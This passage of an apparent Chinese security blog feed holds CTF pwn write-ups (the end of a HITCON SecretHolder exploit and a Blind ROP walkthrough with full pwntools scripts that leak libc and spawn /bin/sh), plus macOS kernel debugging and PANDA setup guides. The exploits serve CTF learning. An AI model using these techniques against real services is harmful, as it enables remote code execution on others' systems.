class="string">"A"</span>*<span class="number">0x10</span></span><br><span class="line">   payload_leak += l64(got_atoi_addr) + l64(got_free_addr) + l64(got_atoi_addr)</span><br><span class="line">   payload_leak += l32(<span class="number">0x1</span>)*<span class="number">3</span></span><br><span class="line">   <span class="comment">#raw_input('0x0000000000400B1E')</span></span><br><span class="line">   Renew_secret(<span class="number">3</span>,payload_leak)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#overwrite free@got to make info leak.</span></span><br><span class="line">   payload_overwrite = l64(plt_puts_addr) + l64(plt_puts_addr+<span class="number">0x6</span>)</span><br><span class="line">   <span class="comment">#leak</span></span><br><span class="line">   <span class="comment">#raw_input('0x0000000000400B1E')</span></span><br><span class="line">   Renew_secret(<span class="number">3</span>,payload_overwrite)</span><br><span class="line"></span><br><span class="line">   Wipe_secret(<span class="number">2</span>)</span><br><span class="line">   tmp = io.read(<span class="number">8</span>)[<span class="number">1</span>:][::<span class="number">-1</span>][<span class="number">1</span>:][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">   leak_atoi_addr = l64(tmp.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"system addr : 0x%x"</span> % leak_atoi_addr</span><br><span class="line">   system_addr = leak_atoi_addr + offset_system_atoi</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"system addr : 0x%x"</span> % system_addr</span><br><span class="line"></span><br><span class="line">   raw_input(<span class="string">'0x0000000000400B1E'</span>)</span><br><span class="line">   Renew_secret(<span class="number">1</span>,l64(system_addr))</span><br><span class="line"></span><br><span class="line">   io.write(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">   io.interact()</span><br></pre></td></tr></table></figure>

<p>不知道为啥<code>io.gdb_hint()</code>没断下来，所以我打断点都是用<code>raw_input()</code>然后attach进去搞的，所以exp看起来贼乱…</p>
<h4 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03:参考"></a>0x03:参考</h4><ul>
<li>   <a href="http://0byjwzsf.me/2016/10/11/hitcon-quals-2016-secretholder/">Icemakr师傅的文章</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Final</title>
    <url>/2017/06/19/Final/</url>
    <content><![CDATA[<p>随笔</p>
<a id="more"></a>



<p>今天终于办完了校赛的决赛，第二次参与出题、运维工作。</p>
<p>去年是学长主力做运维工作，今年到了自己，真的是挺难的。</p>
<p>在这次规模较大的情况下(20支队伍)，怎么配置pwn相关的权限，集中管理pwn服务，怎么做check…真的是做的时候才发现坑有多少。运维脚本从本来以为的100多行写道快500行，功能基本完备，还有待改善吧。</p>
<p>最后，大三要结束了，完成了算是大三最后的一个任务 - 。-  还算不错，小伙伴们都辛苦了。修仙修的人都不好了</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>Debug macOS Kernel</title>
    <url>/2019/10/17/Debug-macOS-Kernel/</url>
    <content><![CDATA[<h2 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 : 环境配置"></a>0x00 : 环境配置</h2><p>基本分为两种情况，虚拟机调试或者双机调试。</p>
<p>虚拟机 ： <code>vmfusion</code>,`` KDK`</p>
<p>双机: 火线。 我这里用的是``mbp2017<code>调</code>mbp2015<code>，借了同事的线，连接为：</code>mbp2017-typec-雷电2-火线-雷电2-mbp2015`。</p>
<a id="more"></a>

<h2 id="0x01-虚拟机"><a href="#0x01-虚拟机" class="headerlink" title="0x01 : 虚拟机"></a>0x01 : 虚拟机</h2><p>下面是标准步骤</p>
<h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><ol start="0">
<li><p>关闭SIP，并且把想要加载的内核拷贝到 内核的目录</p>
<p><code>sudo cp /Library/Developer/KDKs/KDK_YOUR_VERSION/System/Library/Kernels/kernel.development /System/Library/Kernels</code></p>
</li>
<li><p>安装当前版本系统的KDK，[Apple Develop KDK download](<a href="https://developer.apple.com/download/more/?q=Kernel">https://developer.apple.com/download/more/?q=Kernel</a> Debug Kit)</p>
</li>
<li><p>设置启动参数</p>
<p><code> sudo nvram boot-args=&quot;debug=0x14e kext-dev-mode=1 kcsuffix=development pmuflags=1 -v&quot;</code></p>
</li>
<li><p>清理缓存</p>
<p><code> sudo kextcache -invalidate /</code></p>
</li>
<li><p>记住当前vm的ip，然后重启</p>
<p><code>sudo reboot</code></p>
</li>
</ol>
<p>这里把<code>development</code>版本的内核拷贝到<code>System/Library/Kernels</code>里，指定启动时加载<code>development</code>版本的内核，当然也可以加载<code>kasan</code>版本的，看需求。</p>
<h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><ol start="0">
<li>安装被调试机器的KDK</li>
</ol>
<p>这种情况是靠网络调试。</p>
<p>但是根据之前的启动参数，开机时断不下来的，当然可以设置一个0x1来让他启动时断下来等调试器，但是经过测试，这个不好使(可能我环境有问题)。</p>
<p>如果按照上面的设置<code>0x14e</code> ，那么需要在虚拟机中按下 <code>cmd + opt + ctrl + shitf+ esc</code>触发中断，</p>
<p>随后lldb中 : </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">(lldb)kdp-remote you_vm_ip</span><br></pre></td></tr></table></figure>

<p>之后就可以调试了。</p>
<h2 id="0x02-双机调试"><a href="#0x02-双机调试" class="headerlink" title="0x02 : 双机调试"></a>0x02 : 双机调试</h2><p>下面是标准步骤</p>
<h3 id="被调试机"><a href="#被调试机" class="headerlink" title="被调试机"></a>被调试机</h3><ol start="0">
<li><p>关SIP，拷贝KDK里的内核到<code>/System/Library/Kernels</code></p>
</li>
<li><p>安装当前系统版本的KDK</p>
</li>
<li><p>设置启动参数</p>
<p><code>sudo nvram boot-args=&quot;debug=0x14e kdp_match_name=firewire fwkdp=0x8000 kcsuffix=development&quot;</code></p>
</li>
<li><p>清理缓存</p>
<p><code> sudo kextcache -invalidate /</code></p>
</li>
<li><p>重启</p>
<p><code>sudo reboot</code></p>
</li>
</ol>
<p>这里必须说一下，火线的名称，<code>ifconfig</code>里看到的，默认是<code>fw0</code>，但是这个启动参数里必须是<code>firewire</code>，</p>
<p>必须是<code>firewire</code>，必须是<code>firewire</code>！</p>
<p>这个地方坑了我挺久，我一直以为用<code>ifconfig</code>里看到的那个名字  :-(</p>
<h3 id="调试机"><a href="#调试机" class="headerlink" title="调试机"></a>调试机</h3><ol start="0">
<li><p>安装被调试机器的KDK</p>
</li>
<li><p>LLDB加载目标内核</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动fwkdp</p>
<p><code>fwkdp -v</code></p>
</li>
<li><p>被调试机按下<code>cmd+opt+ctrl+shift+esc</code>触发中断</p>
</li>
<li><p>lldb 里连接</p>
<p><code>(lldb) kdp-remote localhost</code></p>
</li>
</ol>
<p>感觉过程就是<code>fwkdp</code>做了转发的工作，所以lldb直接<code>kdp-remote</code>就可以了。</p>
<h2 id="0x03-KDK是必须的吗？"><a href="#0x03-KDK是必须的吗？" class="headerlink" title="0x03 : KDK是必须的吗？"></a>0x03 : KDK是必须的吗？</h2><p>并不是，kdk只是给你更多的内核中的符号，所以不用kdk也没事，就等于直接调试正式版的内核，少了内核符号而已，人肉对比着近期版本的源码其实影响没那么大。</p>
]]></content>
      <categories>
        <category>配置环境踩坑</category>
      </categories>
      <tags>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello PANDA</title>
    <url>/2018/11/08/Hello-PANDA/</url>
    <content><![CDATA[<h4 id="0-Environment"><a href="#0-Environment" class="headerlink" title="0. Environment"></a>0. Environment</h4><p>Ubuntu16.04 x64</p>
<a id="more"></a>



<h4 id="1-Install-Panda"><a href="#1-Install-Panda" class="headerlink" title="1. Install Panda"></a>1. Install Panda</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/moyix/panda.git</span><br><span class="line"><span class="built_in">cd</span> panda</span><br><span class="line">./panda_install.bash</span><br></pre></td></tr></table></figure>



<h4 id="2-Working-Folder-and-HDD"><a href="#2-Working-Folder-and-HDD" class="headerlink" title="2. Working Folder and HDD"></a>2. Working Folder and HDD</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir my_first_panda</span><br><span class="line">$ <span class="built_in">cd</span> my_first_panda</span><br><span class="line">$ ../qemu/qemu-img create -f qcow2 test.img 32G</span><br></pre></td></tr></table></figure>



<h4 id="3-Boot-VM"><a href="#3-Boot-VM" class="headerlink" title="3. Boot VM"></a>3. Boot VM</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024</span><br></pre></td></tr></table></figure>

<p>you will get:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  my_first_panda git:(master) ✗ ../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024</span><br><span class="line"></span><br><span class="line">(process:21836): GLib-WARNING **: /build/glib2.0-7ZsPUq/glib2.0-2.48.2/./glib/gmem.c:483: custom memory allocation vtable not supported</span><br><span class="line">QEMU 1.0,1 monitor - <span class="built_in">type</span> <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> more information</span><br><span class="line">(qemu) change ide1-cd0 win_server_2008_r2.iso </span><br><span class="line">(qemu)</span><br></pre></td></tr></table></figure>

<p>mount your iso file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(qemu) change ide1-cd0 win_server_2008_r2.iso </span><br><span class="line">(qemu)</span><br></pre></td></tr></table></figure>



<h4 id="4-Install-OS"><a href="#4-Install-OS" class="headerlink" title="4. Install OS"></a>4. Install OS</h4><p>Connect your vm with a VNC client, press <code>ctrl + opt + del</code>(on macOS) / <code>ctrl + alt + del</code>(on Windows) to reboot your vm,then you are able to install the OS.</p>
<h4 id="5-Record-Replay-with-PANDA"><a href="#5-Record-Replay-with-PANDA" class="headerlink" title="5. Record/Replay with PANDA"></a>5. Record/Replay with PANDA</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(qemu) begin_record <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>….</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(qemu) end_record</span><br></pre></td></tr></table></figure>

<p>now you can replay (with replay movie plugin)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">../qemu/x86_64-softmmu/qemu-system-x86_64 -replay <span class="built_in">test</span> -panda replaymovie -m 2048</span><br></pre></td></tr></table></figure>

<p>other plugins? Taint?cov?  :)</p>
<h4 id="6-Reference"><a href="#6-Reference" class="headerlink" title="6. Reference"></a>6. Reference</h4><p><a href="https://gist.github.com/bridgeythegeek/d7a6c449287c6e32187be2639a7920bf">My first panda</a></p>
<p><a href="https://github.com/panda-re/panda/blob/master/panda/plugins/callstack_instr/USAGE.md">Panda Usage</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>PANDA</tag>
        <tag>RE</tag>
      </tags>
  </entry>
  <entry>
    <title>Have fun with Blind ROP</title>
    <url>/2017/01/22/Have-fun-with-Blind-ROP/</url>
    <content><![CDATA[<h4 id="0x00-关于BROP"><a href="#0x00-关于BROP" class="headerlink" title="0x00: 关于BROP"></a>0x00: 关于BROP</h4><p>第一次遇到BROP是在HCTF 2016，当时并没有搞定这个东西，前一段时间花了点时间研究了下这种利用方式，搞定了那个题目，顺便也看了下关于BROP的论文和slide，实践了下使用BROP技术搞低版本的ngnix。</p>
<a id="more"></a>

<h4 id="0x01-先说CTF中遇到的"><a href="#0x01-先说CTF中遇到的" class="headerlink" title="0x01: 先说CTF中遇到的"></a>0x01: 先说CTF中遇到的</h4><p>比赛结束后，杭电的师傅们把题目都开源丢github了，所以我直接拿来源码自己编译自己搞了，源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!check())&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Do not dump my memory&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No password, no game&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(buf,<span class="string">&quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>比赛的时候这个题目只给了ip和端口，其他信息就没有了，后面给出了bof的buffer大小作为提示。那么根据这个大小可以计算出payload的结构，所以就可以使用BROP的思路去一步一步搞定这个题目了。</p>
<h4 id="0x02：过程"><a href="#0x02：过程" class="headerlink" title="0x02：过程"></a>0x02：过程</h4><h6 id="1-找到hang-addr"><a href="#1-找到hang-addr" class="headerlink" title="1. 找到hang addr"></a>1. 找到hang addr</h6><p>首先要找到这样一个覆盖<code>ret addr</code>后不会引起服务崩溃的地址，我的做法是暴力跑，利用<code>pwntools</code>的异常处理来判断连接是否挂掉了。<br>就像这样简单粗暴的从<code>0x400000</code>去跑，然后<code>log</code>进文件，最后我只要去查看文件就知道<code>hang addr</code>是什么了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in_file</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="comment">#f = open(&#x27;log.txt&#x27;,&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#f = open(&#x27;gadgets.txt&#x27;,&#x27;a&#x27;)</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;ok addr : 0x%x\n&quot;</span> % addr)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hang_addr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span> * <span class="number">72</span> + p64(addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;WelCome my friend,Do you know password?&#x27;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#for junk</span></span><br><span class="line">        p.recvline()</span><br><span class="line">        <span class="keyword">if</span>(p.recv() != <span class="literal">None</span>):</span><br><span class="line">            log.info(<span class="string">&quot;alive ! at 0x%x&quot;</span> % addr)</span><br><span class="line">            log_in_file(addr)</span><br><span class="line">            p.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e: </span><br><span class="line">        p.close()</span><br><span class="line">        log.info(<span class="string">&quot;dead connection! at 0x%x&quot;</span> % addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#finally,I got hang_addr = 0x400724</span></span><br></pre></td></tr></table></figure>

<h6 id="2-找到gadgets"><a href="#2-找到gadgets" class="headerlink" title="2. 找到gadgets"></a>2. 找到gadgets</h6><p>有了<code>hang addr</code>，下一步就是寻找gadgets了，我这里是直接找通用型<code>gadgets</code>。<br>我放置的payload如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">72</span> + p64(addr) + p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">4</span>)+p64(<span class="number">5</span>)+p64(<span class="number">6</span>)+p64(hang_addr)</span><br></pre></td></tr></table></figure>
<p>如果说，程序不挂那就说明找到了这个gadgets 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop    rbx</span><br><span class="line">pop    rbp</span><br><span class="line">pop    r12</span><br><span class="line">pop    r13</span><br><span class="line">pop    r14</span><br><span class="line">pop    r15</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gadgets_addr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span> * <span class="number">72</span> + p64(addr) + p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">4</span>)+p64(<span class="number">5</span>)+p64(<span class="number">6</span>)+p64(hang_addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;WelCome my friend,Do you know password?&#x27;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#for junk</span></span><br><span class="line">        p.recvline()</span><br><span class="line">        <span class="keyword">if</span>(p.recv() != <span class="literal">None</span>):</span><br><span class="line">            log.info(<span class="string">&quot;find gadgets at 0x%x&quot;</span> % addr)</span><br><span class="line">            log_in_file(addr)</span><br><span class="line">            p.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e: </span><br><span class="line">        p.close()</span><br><span class="line">        log.info(<span class="string">&quot;dead connection! at 0x%x&quot;</span> % addr)</span><br></pre></td></tr></table></figure>
<p>最后我得到的结果是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ppppppr_addr = <span class="number">0x4007ba</span></span><br><span class="line">gadget2 = ppppppr_addr - <span class="number">0x1a</span></span><br><span class="line">gadget1 = ppppppr_addr</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gadget1:</span></span><br><span class="line"><span class="string">    mov    rdx,r13</span></span><br><span class="line"><span class="string">    mov    rsi,r14</span></span><br><span class="line"><span class="string">    mov    edi,r15d</span></span><br><span class="line"><span class="string">    call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="string">    add    rbx,0x1</span></span><br><span class="line"><span class="string">    cmp    rbx,rbp</span></span><br><span class="line"><span class="string">    jne    4007a0 &lt;__libc_csu_init+0x40&gt;</span></span><br><span class="line"><span class="string">    add    rsp,0x8</span></span><br><span class="line"><span class="string">gadget2:</span></span><br><span class="line"><span class="string">    pop    rbx</span></span><br><span class="line"><span class="string">    pop    rbp</span></span><br><span class="line"><span class="string">    pop    r12</span></span><br><span class="line"><span class="string">    pop    r13</span></span><br><span class="line"><span class="string">    pop    r14</span></span><br><span class="line"><span class="string">    pop    r15</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h6 id="3-构造leak去dump-bin-file"><a href="#3-构造leak去dump-bin-file" class="headerlink" title="3. 构造leak去dump bin file"></a>3. 构造leak去dump bin file</h6><p>通用型gadgets的构造我这里使用了Icemakr写好的一个函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#this func from Icemakr. thx.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span>(<span class="params">part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span></span>):</span></span><br><span class="line">    payload  = p64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">56</span>     <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<p>后面直接构造leak函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line">    <span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">    <span class="comment">#raw_input(&#x27;#&#x27;)</span></span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*<span class="number">72</span> + com_gadget(gadget1,gadget2,puts_addr,arg1=addr)+p64(hang_addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;WelCome my friend,Do you know password?&#x27;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recvline()</span><br><span class="line">        data = p.recvline().strip()</span><br><span class="line">        <span class="keyword">if</span>(data != <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = data[<span class="number">0</span>:data.index(<span class="string">&quot;WelCome&quot;</span>)]</span><br><span class="line">            <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">                data = data</span><br><span class="line">            <span class="comment">#if leak data is 0x00</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                data = <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="comment">#if leak data is end with 0x0a</span></span><br><span class="line">            <span class="keyword">elif</span>(data[<span class="built_in">len</span>(data)- <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> data[<span class="built_in">len</span>(data)- <span class="number">2</span>] == <span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">                data = data.strip()</span><br><span class="line">                data = data+<span class="string">&quot;\x0a&quot;</span></span><br><span class="line">            log.info(<span class="string">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr,(data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e: </span><br><span class="line">        p.close()</span><br><span class="line">        log.info(<span class="string">&quot;dead connection! at 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<p>其实只要分别从0x400000和0x600000开始dump就可以。</p>
<h6 id="4-getshell"><a href="#4-getshell" class="headerlink" title="4.getshell"></a>4.getshell</h6><p>有了dump之后就得到了got表的信息，下面就可以正常的做了，leak函数地址，查偏移，然后构造rop，然后getshell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span>(<span class="params">part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span></span>):</span></span><br><span class="line">    payload  = p64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">56</span>     <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">hang_addr = <span class="number">0x400724</span></span><br><span class="line">ppppppr_addr = <span class="number">0x4007ba</span></span><br><span class="line">gadget1 = ppppppr_addr</span><br><span class="line">gadget2 = ppppppr_addr - <span class="number">0x1a</span></span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">pop_rdi = gadget1 + (<span class="number">0x400E72</span> - <span class="number">0x400E6A</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += com_gadget(gadget1,gadget2,puts_got,arg1=<span class="number">0</span>,arg2=puts_got)+p64(hang_addr)</span><br><span class="line">payload += p64(hang_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">content = p.recv()</span><br><span class="line">puts_addr = u64(content[:-<span class="number">1</span>] + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset_system = <span class="number">0x45390</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x18c177</span></span><br><span class="line">system_addr = puts_addr - (<span class="number">0x6f690</span> - offset_system)</span><br><span class="line">bin_sh_addr = puts_addr - (<span class="number">0x6f690</span> - offset_str_bin_sh)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="0x03-参考与引用"><a href="#0x03-参考与引用" class="headerlink" title="0x03: 参考与引用"></a>0x03: 参考与引用</h4><p><a href="http://www.scs.stanford.edu/brop/">BROP</a><br><a href="https://github.com/Ic3makr/pwnable">Icemakr师傅的git</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf writeup</tag>
        <tag>pwn</tag>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>LL LR SLR LALR傻傻分不清</title>
    <url>/2018/02/11/LL-LR-SLR-LALR%E5%82%BB%E5%82%BB%E5%88%86%E4%B8%8D%E6%B8%85/</url>
    <content><![CDATA[<pre><code>撸公开课的时候被这几个文法绕晕了。搜了很多东西，合并整理方便后续查看。</code></pre>
<a id="more"></a>

<h4 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01: 概念"></a>0x01: 概念</h4><p>  首先，LL文法是自顶向下，用的是推导；LR、SLR、LALR是自底向上，用的是规约。</p>
<h5 id="1-LL-1"><a href="#1-LL-1" class="headerlink" title="1. LL(1)"></a>1. LL(1)</h5><p>第一个L代表从左向右扫描输入符号串，第二个L代表产生最左推导，1代表在分析过程中执行每一步推导都要向前查看一个输入符号——当前正在处理的输入符号。<br>龙书上的判断规则是：</p>
